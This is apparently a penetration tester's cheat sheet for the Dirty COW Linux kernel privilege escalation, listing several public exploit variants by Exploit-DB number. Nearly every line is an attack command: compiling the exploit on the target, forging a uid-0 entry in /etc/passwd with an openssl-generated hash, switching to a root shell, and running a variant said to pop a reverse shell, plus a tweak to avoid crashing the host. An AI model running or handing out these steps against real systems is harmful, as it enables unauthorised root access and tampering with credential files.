# dirty cow - 40611.c

# compile on target
gcc -pthread 40611.c -o dirtyc0w

# generate hash for /etc/passwd
openssl passwd -1 -salt <user> <password>

# append new user to /etc/passwd
./dirtyc0w /etc/passwd "<user>:<hash>:0:0:root:/bin/bash"

# change to root shell
su <user>

# another variant - 40839.c

# compile on target
gcc -pthread 40839.c -o dirty -lcrypt

# append new user to /etc/passwd
./dirty <password>

# change to root shell
su firefart

# another variant - https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c

# (un)comment correct payload first (x86 or x64)

# compile on target
gcc cowroot.c -o cowroot -pthread

# run exploit
./cowroot

# disable dirty writeback may prevent machine from crash
echo 0 > /proc/sys/vm/dirty_writeback_centisecs

# another variant - 40847.cpp

# compile on target
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil

# pop reverse shell (automatically disable dirty writeback)
./dcow -s

# References:
https://www.exploit-db.com/exploits/40611
https://www.exploit-db.com/exploits/40839

